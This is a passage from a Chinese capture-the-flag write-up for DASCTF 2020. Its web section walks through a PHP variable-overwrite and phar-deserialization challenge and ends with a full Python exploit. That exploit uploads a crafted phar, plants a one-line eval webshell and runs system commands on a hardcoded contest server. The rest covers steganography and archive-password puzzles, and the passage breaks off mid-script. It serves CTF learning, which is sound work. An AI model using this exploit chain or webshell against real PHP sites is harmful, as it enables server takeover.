single-quoted-string">'tp2'</span><span class="token operator">=></span><span class="token string single-quoted-string">'tp2.tpl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'tp3'</span><span class="token operator">=></span><span class="token string single-quoted-string">'tp3.tpl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$tp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$tp</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No! You only have 3 template to reader"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">[</span><span class="token variable">$tp</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Please choice one template to reader"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>关键点<code>exract</code>，可见变量覆盖<code>template</code>再利用<code>tp</code>达到任意文件读取。不过不可能直接读flag的，先读了<code>template.php</code></p><p><code>./?var[template][1]=template.php&amp;tp=1</code></p><pre class="language-php" data-language="php"><code class="language-php">//template.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".html"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/uploads/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your html file is in "</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>注意到关键点有个全局变量，联想到之前的变量覆盖，这里肯定是可以利用的。</p><p>类<code>Template</code>大概意思就是传入的<code>content</code>，利用<code>pattern</code>进行正则匹配，利用全局变量中的值替换匹配到的值，最后输出以<code>suffix</code>后缀的文件。</p><p>摸索一番后确认为神奇的phar反序列化，考点为文件上传和命令执行。</p><p>利用脚本生成phar文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&#123;&#123;gyycoming&#125;&#125;"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/uploads/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your html file is in "</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>可以看到<code>content</code>为<code>gyycoming</code>，之后变量覆盖<code>gyycoming</code>为一句话木马，生成.php文件，即可成功getshell</p><p>还有更好的方法，直接<code>content</code>为一句话木马，<code>pattern</code>直接删掉，既然可以phar反序列化，就有很多姿势了。</p><p>首先用<code>php://input</code>伪协议上传phar文件。</p><p><code>./tp=1&amp;var[template][1]=php://input</code>，POST上传phar</p><p>然后触发phar文件，利用<code>phar://</code>伪协议</p><p><code>./?var[template][1]=phar://&quot;+&lt;url_path&gt;+&quot;&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?&gt;</code></p><img src="/article/dasctf2020/image-20201228193214814.png" class="" title="image-20201228193214814" loading="lazy"><p>可以看到第一个是正常的文件，第二个是触发phar反序列化写入的.php文件，蚁剑连上，到根目录执行<code>/readflag</code>即可。</p><img src="/article/dasctf2020/image-20201228193429000.png" class="" title="image-20201228193429000" loading="lazy"><p>所以直接读是不可以的，<code>400</code>没有权限，需要执行<code>/readflag</code>。</p><p>最后附上exp</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/25 14:24@Auth ： gyy@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> osbaseurl <span class="token operator">=</span> <span class="token string">"http://8.129.41.25:10305/"</span><span class="token keyword">def</span> <span class="token function">phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    php <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?phpclass Template&#123;    public $content;    public $pattern;    public $suffix;    public function __construct()&#123;        $this->content = "&#123;&#123;gyycoming&#125;&#125;";        $this->pattern = "/&#123;&#123;([a-z]+)&#125;&#125;/";        $this->suffix = ".php";    &#125;    public function __destruct() &#123;        $this->render();    &#125;    public function render() &#123;        while (True) &#123;            if(preg_match($this->pattern, $this->content, $matches)!==1)                break;            global $&#123;$matches[1]&#125;;            if(isset($&#123;$matches[1]&#125;)) &#123;                $this->content = preg_replace($this->pattern, $&#123;$matches[1]&#125;, $this->content);            &#125;            else&#123;                break;            &#125;        &#125;        if(strlen($this->suffix)>5) &#123;            echo "error suffix";            die();        &#125;        $filename = '/var/www/html/uploads/' . md5($_SERVER['REMOTE_ADDR']) . "/" . md5($this->content) . $this->suffix;        file_put_contents($filename, $this->content);        echo "Your html file is in " . $filename;    &#125;&#125;$phar = new Phar('phar.phar');$phar -> stopBuffering();$phar -> setStub('&lt;?php __HALT_COMPILER();?>');$phar -> addFromString('test.txt','test');$object = new Template();$phar -> setMetadata($object);$phar -> stopBuffering();?>'''</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar.php'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>php<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.php is create'</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'php phar.php'</span><span class="token punctuation">)</span>    a<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.phar is create'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] create phar file wrong."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">up_phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?tp=1&amp;var[template][1]=php://input"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        pharfile <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>pharfile<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file to ----> "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"/var/www/html/"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        upurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token builtin">str</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] upload pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phar_trigger</span><span class="token punctuation">(</span>upurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?var[template][1]=phar://"</span><span class="token operator">+</span>upurl<span class="token operator">+</span><span class="token string">"&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?>"</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shell file ----> "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">".php"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        shellurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> shellurl    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] trigger pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"gyy"</span> <span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"system('/readflag');"</span>    phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    upurl <span class="token operator">=</span> up_phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shellurl <span class="token operator">=</span> phar_trigger<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shell<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span> payload<span class="token punctuation">)</span></code></pre><hr><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><hr><h4 id="马老师的秘籍"><a href="#马老师的秘籍" class="headerlink" title="马老师的秘籍"></a>马老师的秘籍</h4><p>签到题</p><img src="/article/dasctf2020/image-20201228193732975.png" class="" title="image-20201228193732975" loading="lazy"><p>首先拿到一张图片，随便扫了一个，竟然是招式名称…不过既然是题目，图片肯定不止是图片…用十六进制查看，底部发现了zip标志头<code>50 4D 03 04</code></p><img src="/article/dasctf2020/image-20201228193923701.png" class="" title="image-20201228193923701" loading="lazy"><p>用foremost提前或者直接拖到最后新建十六进制文件搞出来，是个压缩包</p><img src="/article/dasctf2020/image-20201228194027067.png" class="" title="image-20201228194027067" loading="lazy"><p>有加密，所以检查一下，发现有伪加密，直接修改加密位拖出来jpg文件，其他两个是真加密</p><img src="/article/dasctf2020/image-20201228194144848.png" class="" title="image-20201228194144848" loading="lazy"><p>图片很花，不过依稀能看出来东西的</p><img src="/article/dasctf2020/image-20201228194307542.png" class="" title="image-20201228194307542" loading="lazy"><p>所以利用Stegsolve，把这张和原图异或一下即可</p><img src="/article/dasctf2020/image-20201228194456072.png" class="" title="image-20201228194456072" loading="lazy"><p><code>md5(NianQingRenBuJiangWuDe)</code></p><p>那这串去解密真加密文件<code>c57988283c92f759585a0c1aebfdd743</code>，密码正确。</p><p>这里有人说明文攻击也行…没跑过，大概可以吧。</p><p>文本文件里一堆<code>左正蹬 右鞭腿 左刺拳</code>，第二个里面</p><pre class="language-none"><code class="language-none">左正蹬 -&gt; .右鞭腿 -&gt; !左刺拳 -&gt; ?</code></pre><p>很显然，替换。替换完后只有<code>.!?</code>，推测为Ook!加密，直接去解，得到flag</p><img src="/article/dasctf2020/image-20201228195508111.png" class="" title="image-20201228195508111" loading="lazy"><hr><h4 id="FakePic"><a href="#FakePic" class="headerlink" title="FakePic"></a>FakePic</h4><p>RAR压缩包注释提示密码为1???小写字母，共四位</p><img src="/article/dasctf2020/image-20201228195736671.png" class="" title="image-20201228195736671" loading="lazy"><p>输出个字典用ARPA准备跑，结果提示这不是个RAR文件，则为RAR5格式，利用hashcat破解，得到密码<code>1cpp</code></p><p>解压后一个图片一个提示</p><pre class="language-none"><code class="language-none">10132430取最前面500位就行</code></pre><p>Stegsolve分析一波无果，提示也一头雾水。最后在十六进制查看在文件末尾时发现提示</p><img src="/article/dasctf2020/image-20201228195943508.png" class="" title="image-20201228195943508" loading="lazy"><p>分析到这没做了，电脑有问题没装上PIL模块。</p><p>赛后参考<a href="https://l1near.top/index.php/2020/12/27/87.html">大师傅博客</a>，利用脚本跑出Alpha通道前几个点，发现</p><img src="/article/dasctf2020/image-20201228203355447.png" class="" title="image-20201228203355447" loading="lazy"><p> 都是2的倍数，且倍数都不大。结合前面的提示（而且提示的长度还为8）。那么就猜测提示的作用是这样的：<code>10132430</code>得这样分<code>1 0 1 3 2 4 3 0</code>，然后这8个为一轮一直循环。如果刚好轮到这个数，算出来的<code>pow(2,x)</code>和Alpha通道的值一样，那么就为1，否则就为0。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagepic <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span>width<span class="token punctuation">,</span>height <span class="token operator">=</span> pic<span class="token punctuation">.</span>sizeflag <span class="token 